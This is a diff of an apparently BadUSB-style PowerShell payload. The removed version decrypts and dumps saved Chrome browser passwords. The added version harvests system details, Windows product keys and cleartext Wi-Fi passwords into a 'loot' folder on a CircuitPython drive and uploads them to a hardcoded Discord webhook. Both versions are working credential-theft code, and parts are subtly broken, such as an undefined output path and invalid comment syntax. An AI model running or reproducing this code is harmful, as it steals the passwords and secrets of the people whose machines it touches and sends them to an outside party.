@@ -1,183 +1,125 @@
-$default_browser = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice').ProgId | ForEach-Object { (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\$_\shell\open\command").'(default)' -replace '"%1"','' -replace '"','' }
-Import-Module -Name 'PSSQLite'
-Add-Type -AssemblyName System.Security
+$timestamp = Get-Date -Format "yyyy-MM-dd_HHmm"
+$BBPath = (Get-WmiObject win32_volume -f 'label=''CIRCUITPY''').Name+"loot\$timestamp\"
+$LootDir = New-Item -ItemType directory -Force -Path "$BBPath"
 
-$APP_DATA_PATH = [System.Environment]::GetFolderPath('LocalApplicationData')
-$DB_PATH = 'Google\Chrome\User Data\Default\Login Data'
+# CORE SYSTEM INFO
+$sysInfo = [PSCustomObject]@{
+    Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+    ComputerName = $env:COMPUTERNAME
+    Username = "$env:USERDOMAIN\$env:USERNAME"
+}
 
-$NONCE_BYTE_SIZE = 12
+# OPERATING SYSTEM
+try {
+    $os = Get-CimInstance -ClassName Win32_OperatingSystem
+    $sysInfo | Add-Member -MemberType NoteProperty -Name "OS" -Value "$($os.Caption) (Build $($os.BuildNumber))"
+} catch { $sysInfo | Add-Member -MemberType NoteProperty -Name "OS" -Value "N/A" }
 
+# HARDWARE INFO
+try {
+    $cpu = Get-CimInstance -ClassName Win32_Processor
+    $gpu = Get-CimInstance -ClassName Win32_VideoController | Select-Object -First 1
+    $ram = [math]::Round((Get-CimInstance -ClassName CIM_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB, 2)
+    
+    $sysInfo | Add-Member -MemberType NoteProperty -Name "CPU" -Value $cpu.Name.Trim()
+    $sysInfo | Add-Member -MemberType NoteProperty -Name "GPU" -Value $gpu.Name.Trim()
+    $sysInfo | Add-Member -MemberType NoteProperty -Name "RAM" -Value "$ram GB"
+} catch { /* Silently continue */ }
 
-#Univeral Browser stuff:
+# NETWORK INFO
+try {
+    $network = Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null } | Select-Object -First 1
+    $publicIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 3).Content
+    
+    $sysInfo | Add-Member -MemberType NoteProperty -Name "LocalIP" -Value $network.IPv4Address.IPAddress
+    $sysInfo | Add-Member -MemberType NoteProperty -Name "PublicIP" -Value $publicIP
+    $sysInfo | Add-Member -MemberType NoteProperty -Name "Gateway" -Value $network.IPv4DefaultGateway.NextHop
+} catch { /* Silently continue */ }
 
-function Get-DefaultBrowserCommand {
-    try {
-        $progId = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice' -ErrorAction Stop).ProgId
-        return (Get-ItemProperty "Registry::HKEY_CLASSES_ROOT\$progId\shell\open\command").'(default)'
-    } catch {
-        return $null
+# WINDOWS KEYS
+try {
+    $biosKey = (wmic path softwarelicensingservice get OA3xOriginalProductKey 2>$null | Where-Object { $_ -match '[A-Z0-9]' }).Trim()
+    $regKey = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform" -Name "BackupProductKeyDefault" -ErrorAction SilentlyContinue).BackupProductKeyDefault
+    
+    $sysInfo | Add-Member -MemberType NoteProperty -Name "BIOS_Key" -Value $biosKey
+    $sysInfo | Add-Member -MemberType NoteProperty -Name "Registry_Key" -Value $regKey
+} catch { /* Silently continue */ }
+
+# WI-FI CREDENTIALS
+"Wifi knew:" >> "$LootDir\computer_info.txt"
+# Not the best way to do it but it works
+$profiles = netsh wlan show profiles | Select-String ":\s+(.+?)\s*$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
+
+$wifiInfo = foreach ($profile in $profiles) {
+    $profileInfo = (netsh wlan show profile name="$profile" key=clear) -join "`r`n"
+    
+    "Temp file for Regex: $profile" | Out-File -Append -FilePath "$LootDir\wifi_debug.txt" -Encoding utf8
+    $profileInfo | Out-File -Append -FilePath "$LootDir\wifi_debug.txt" -Encoding utf8
+    $password = $null
+    
+    if ($profileInfo -match "Contenu de la cl[^\n]*:\s*([^\n]+)") {
+        $password = $matches[1].Trim()
     }
-}
-
-function Resolve-BrowserUserDataPath {
-    param([string]$browserCmd)
-
-    if (-not $browserCmd) { return $null }
-
-    $exePath = ($browserCmd -split '\s+')[0].Trim('"')
-    $exeName = [System.IO.Path]::GetFileName($exePath).ToLower()
-    $appParent = Split-Path $exePath -Parent
-
-    switch ($exeName) {
-        'chrome.exe'   { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
-        'msedge.exe'   { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
-        'brave.exe'    { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
-        'vivaldi.exe'  { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
-        'chromium.exe' { return Join-Path (Split-Path $appParent -Parent) 'User Data' }
-        'opera.exe'    { return Join-Path $env:APPDATA 'Opera Software\Opera Stable' }
-        'firefox.exe'  { return Join-Path $env:APPDATA 'Mozilla\Firefox\Profiles' }
-        default        { return $null }
+    elseif ($profileInfo -match "Key Content[^\n]*:\s*([^\n]+)") {
+        $password = $matches[1].Trim()
     }
-}
-
-$cmd = Get-DefaultBrowserCommand
-if (-not $cmd) {
-    Write-Host "Could not determine default browser."
-    return
-}
-
-$userDataPath = Resolve-BrowserUserDataPath $cmd
-
-$DB_PATH="$userDataPath\Default\Login Data"
-
-function Encrypt($cipher, $plaintext, $nonce) {
-    $cipher.Mode = [System.Security.Cryptography.CipherMode]::GCM
-    $encryptor = $cipher.CreateEncryptor()
-    $ciphertext = $encryptor.TransformFinalBlock($plaintext, 0, $plaintext.Length)
-    return @($cipher, $ciphertext, $nonce)
-}
-
-function Decrypt($cipher, $ciphertext, $nonce) {
-    $cipher.Mode = [System.Security.Cryptography.CipherMode]::GCM
-    $decryptor = $cipher.CreateDecryptor()
-    return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
-}
-
-function Get-Cipher($key) {
-    $aes = New-Object System.Security.Cryptography.AesManaged
-    $aes.Key = $key
-    return $aes
-}
-
-function DPAPI-Decrypt($encrypted) {
-    $blobin = New-Object System.Security.Cryptography.DataProtection.ProtectedData
-    return [System.Security.Cryptography.ProtectedData]::Unprotect($encrypted, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
-}
-
-function Unix-Decrypt($encrypted) {
-    if ($IsLinux) {
-        $password = 'peanuts'
-        $iterations = 1
-    } else {
-        throw "NotImplementedError"
-    }
-
-    $salt = 'saltysalt'
-    $iv = ' ' * 16
-    $length = 16
-    $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new($password, [System.Text.Encoding]::UTF8.GetBytes($salt), $iterations).GetBytes($length)
-    $aes = [System.Security.Cryptography.Aes]::Create()
-    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
-    $aes.IV = [System.Text.Encoding]::UTF8.GetBytes($iv)
-    $decryptor = $aes.CreateDecryptor($key, $aes.IV)
-    $decrypted = $decryptor.TransformFinalBlock($encrypted[3..$encrypted.Length], 0, $encrypted.Length - 3)
-    return $decrypted[0..($decrypted.Length - 1 - [System.Text.Encoding]::UTF8.GetBytes($decrypted[-1]))]
-}
-
-function Get-KeyFromLocalState {
-    $path = Join-Path $APP_DATA_PATH '$userDataPath\Local State'
-    $json = Get-Content -Path $path -Raw | ConvertFrom-Json
-    return $json.os_crypt.encrypted_key
-}
-
-function Aes-Decrypt($encrypted_txt) {
-    $encoded_key = Get-KeyFromLocalState
-    $encrypted_key = [Convert]::FromBase64String($encoded_key)
-    $encrypted_key = $encrypted_key[5..$encrypted_key.Length]
-    $key = DPAPI-Decrypt($encrypted_key)
-    $nonce = $encrypted_txt[3..15]
-    $cipher = Get-Cipher($key)
-    return Decrypt($cipher, $encrypted_txt[15..$encrypted_txt.Length], $nonce)
-}
-
-class password_man {
-    [string[]]$PasswordList = @()
-
-    [void] GetDataBase() {
-        $full_path = Join-Path $APP_DATA_PATH $DB_PATH
-        $temp_path = Join-Path $APP_DATA_PATH 'sqlite_file'
-        if (Test-Path $temp_path) {
-            Remove-Item $temp_path
-        }
-        Copy-Item -Path $full_path -Destination $temp_path
-        $this.Show-Password($temp_path)
-    }
-
-    [void] Show-Password($db_file) {
-        $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db_file;Version=3;")
-        $conn.Open()
-        $sql = 'SELECT signon_realm, username_value, password_value FROM logins'
-        $command = $conn.CreateCommand()
-        $command.CommandText = $sql
-        $reader = $command.ExecuteReader()
-        while ($reader.Read()) {
-            $host = $reader[0]
-            if ($host.StartsWith('android')) {
-                continue
+    else {
+        $lines = $profileInfo -split "`r?`n"
+        foreach ($line in $lines) {
+            if ($line -match "Contenu de la cl[^:]*:\s*(.+)") {
+                $password = $matches[1].Trim()
+                break
             }
-            $name = $reader[1]
-            $value = $this.ChromeDecrypt($reader[2])
-            $info = "Hostname: $host`nUsername: $name`nPassword: $value`n`n"
-            $this.PasswordList += $info
-        }
-        $conn.Close()
-        Remove-Item $db_file
-    }
-
-    [string] ChromeDecrypt($encrypted_txt) {
-        if ($IsWindows) {
-            try {
-                if ($encrypted_txt[0..3] -eq [byte[]](0x01, 0x00, 0x00, 0x00)) {
-                    $decrypted_txt = DPAPI-Decrypt($encrypted_txt)
-                    return [System.Text.Encoding]::UTF8.GetString($decrypted_txt)
-                } elseif ($encrypted_txt[0..2] -eq [byte[]](0x76, 0x31, 0x30)) {
-                    $decrypted_txt = Aes-Decrypt($encrypted_txt)
-                    return [System.Text.Encoding]::UTF8.GetString($decrypted_txt[0..($decrypted_txt.Length - 17)])
-                }
-            } catch {
-                return $null
-            }
-        } else {
-            try {
-                return Unix-Decrypt($encrypted_txt)
-            } catch {
-                return $null
+            elseif ($line -match "Key Content[^:]*:\s*(.+)") {
+                $password = $matches[1].Trim()
+                break
             }
         }
     }
-
-    [void] SavePasswords() {
-        $path = "$env:LOCALAPPDATA\Temp\pws.txt"
-        $dir = Split-Path $path
-        if (-not (Test-Path $dir)) {
-            New-Item -ItemType Directory -Path $dir | Out-Null
-        }
-        $this.PasswordList | Out-File -FilePath $path -Encoding UTF8
+    
+    [PSCustomObject]@{
+        PROFILE_NAME = $profile
+        PASSWORD = if ($password) { $password } else { "NA" } #Not available
     }
-
 }
 
-# Main execution
-$main = [password_man]::new()
-$main.GetDataBase()
-$main.SavePasswords()
+# OUTPUT
+$output = @"
+=== SYSTEM AUDIT (LITE) ===
+Generated: $($sysInfo.Timestamp)
+
+[SYSTEM]
+Computer: $($sysInfo.ComputerName)
+User: $($sysInfo.Username)
+OS: $($sysInfo.OS)
+CPU: $($sysInfo.CPU)
+GPU: $($sysInfo.GPU)
+RAM: $($sysInfo.RAM)
+
+[NETWORK]
+Local IP: $($sysInfo.LocalIP)
+Public IP: $($sysInfo.PublicIP)
+Gateway: $($sysInfo.Gateway)
+
+[WINDOWS KEYS]
+BIOS Key: $($sysInfo.BIOS_Key)
+Registry Key: $($sysInfo.Registry_Key)
+WindowsBackupSerial: $($WindowsBackupSerial)
+
+[WI-FI NETWORKS]
+$($wifiInfo | Format-Table -AutoSize | Out-String)
+
+"@
+
+# SAVE TO FILE
+$output | Out-File -FilePath "$LootDir\computer_info.txt" -Encoding UTF8
+
+# OPTIONAL: UPLOAD TO DISCORD
+$webhookUrl = "https://discord.com/api/webhooks/1428095697907093587/tv1cDhhfMl2cG32uzGrQgeTK-tTGk0L9dHvNcRkK6VbFKcQWYokDGPx47Lb4GvWl5G2m"
+if ($webhookUrl -ne "YOUR_WEBHOOK_URL") {
+    $body = @{
+        content = "System audit from $($sysInfo.ComputerName)"
+        file = Get-Item -Path $outputFile
+    }
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "multipart/form-data"
+}
